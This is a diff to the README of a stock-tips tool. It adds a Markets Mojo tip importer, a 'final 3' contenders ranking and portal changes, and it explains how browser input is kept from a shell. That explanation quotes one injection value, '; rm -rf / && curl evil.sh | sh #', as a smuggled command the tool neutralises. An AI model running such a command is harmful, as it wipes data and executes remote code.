@@ -53,7 +53,7 @@ docs/                    the portal (GitHub Pages): index.html + data.json + man
 .github/workflows/       desk.yml — the workflow the portal dispatches to run a command and commit the result
 scripts/                 desk_command.py (env → argv, no shell), record_run.py (the visible action log)
 src/stocktips/           the package — data/, sources/, analysis/, portfolio/, learning/, pipeline.py, report.py, cli.py
-tests/                   ledger lifecycle, extraction, plan geometry (no network)
+tests/                   ledger lifecycle, extraction, plan geometry, the Mojo importer, the dispatch bridge (no network)
 ```
 
 ## Running it by hand
@@ -71,6 +71,10 @@ python -m stocktips close CGPOWER          # discretionary exit: cancel a pendin
 python -m stocktips capital --add 50000    # move the capital base (recorded as a dated ledger event)
 python -m stocktips add-tip --source manual:mohan --symbol TATASTEEL \
        --target "195,210" --stop 168 --timeframe monthly --text "<the original message>"
+python -m stocktips import-tips --file mojo-paste.txt --dry-run   # read a Markets Mojo paste, write nothing
+python -m stocktips import-tips --file mojo-paste.txt             # ...and log every call it resolved
+pbpaste | python -m stocktips import-tips --source mojo           # or straight off the clipboard
+python -m stocktips contenders --top 3     # rank today's ideas head to head, with each tipster's claim beside our plan
 python -m stocktips analyze-symbol TATASTEEL --tf weekly
 python -m stocktips add-source --kind telegram --id tg_foo --channel foo --name "Telegram — @foo"
 python -m stocktips lesson "Breakouts on 1.5x volume kept failing in a falling Nifty — require Nifty > 20EMA for breakout picks."
@@ -88,16 +92,56 @@ Stops go a hair below the nearest qualifying swing support (≥ 0.6 ATR away, �
 ## The portal
 
 `docs/index.html` is one self-contained page — vanilla JS, Chart.js from cdnjs, Manrope and JetBrains
-Mono from Google Fonts — reading `docs/data.json`. Five tabs, dark by default, installable to a phone
+Mono from Google Fonts — reading `docs/data.json`. Five tabs, light by default, installable to a phone
 home screen, and everything the CLI can do is a button on it.
 
 ```
 The book    positions with a 60-session price chart, the plan drawn across it, and a target ladder
-Ideas       every BUY-grade name not in the book, sorted by which should pay first
+Ideas       the final 3 head to head, then every BUY-grade name, sorted by which should pay first
 Journal     equity curve, closed trades, capital flows, the lessons file
 Sources     the confidence table — what each tipster has actually earned
-Console     connect GitHub, run the pipeline, paste a tip, move capital, record a lesson
+Console     connect GitHub, import Markets Mojo, run the pipeline, paste a tip, move capital, log a lesson
 ```
+
+### Markets Mojo, pasted
+
+Mojo's calls arrive as text — either the whole calls table off the screen, or one call's detail
+panel. Paste either into **Console → Import from Markets Mojo** and the page says what it read
+before anything is dispatched: how many calls, which are Buy, which are Sell, and the three numbers
+each one claims. Press Import and `stocktips import-tips` does the real work:
+
+* both paste shapes are read into one record — `src/stocktips/sources/mojo.py`;
+* names are matched against the NSE master **offline**, which matters because Mojo truncates them to
+  fit its column (`Motil.Oswal.Fin.` → `MOTILALOFS`, `Container Corpn.` → `CONCOR`,
+  `Firstsour.Solu.` → `FSL`). A name that could be two companies comes back **unresolved with its
+  candidates** rather than guessed, and the run says which rows need a person;
+* their entry, target and stop are filed as *claims* (`src_entry`, `src_targets`, `src_stop`), never
+  as levels. `build_plan` reads the chart;
+* a **Sell** call is recognised as a short — including a row labelled Buy whose target sits below its
+  entry, where the arithmetic wins over the label. It is still logged, so Mojo gets graded on it,
+  but `structure` drops non-buy calls and this desk never books a short;
+* `mojo` starts at confidence 0 like every other source and earns its weight from outcomes.
+
+Then **Re-analyse** and look at the final 3.
+
+### The final 3
+
+`analyze` scores every idea on its own merits, which leaves a long list. `contenders` ranks them
+against each other and names the few worth the next rupee:
+
+```
+composite                       chart + business + how well that source has actually done
++10 → -10   the clock           sessions the chart's own drift needs to reach T1, against the time stop
+                                (-8 when there is no measurable drift, so T1 has no date on it)
+ +0 → +6    momentum            the drift it is actually running at, not the target someone wants
+ +4 each    corroboration       a second independent source on the same name, capped at two
+   -4       claim stretch       a tipster asking for more than half again what the chart offers
+```
+
+Each contender is drawn with **They said** beside **This desk** — entry, target, stop, upside, risk —
+so the divergence is on the page rather than in someone's head, with a line naming it: their target
+landing inside our ladder, above our T3, or their stop being the looser of the two. `stocktips
+contenders --top 3` prints the same thing.
 
 ### When each target should land
 
@@ -154,7 +198,11 @@ Without a token every button still works: it queues the intent locally and hands
 **Browser input never reaches a shell.** `scripts/desk_command.py` maps environment variables onto an
 argv list against a fixed spec, so a `--note` of `"; rm -rf / && curl evil.sh | sh #"` is one string
 argument and stays one. Commands outside the spec, missing required inputs, and flags a command does
-not accept are all refused before anything runs. `scripts/record_run.py` appends every run to
+not accept are all refused before anything runs. Nothing a browser sends is interpolated into a
+`run:` block either — every use goes through `env:` and is quoted, which a test asserts. Since
+`workflow_dispatch` allows only ten inputs and the desk has more fields than that, the common ones
+are named and the rest ride along as JSON in `args`; those keys can never overwrite a named input,
+so a check on `symbol` cannot be passed and then quietly re-pointed. `scripts/record_run.py` appends every run to
 `state/actions_log.json`, so the last twenty actions are visible on the page with no token at all.
 
 ### Capital and the honest return
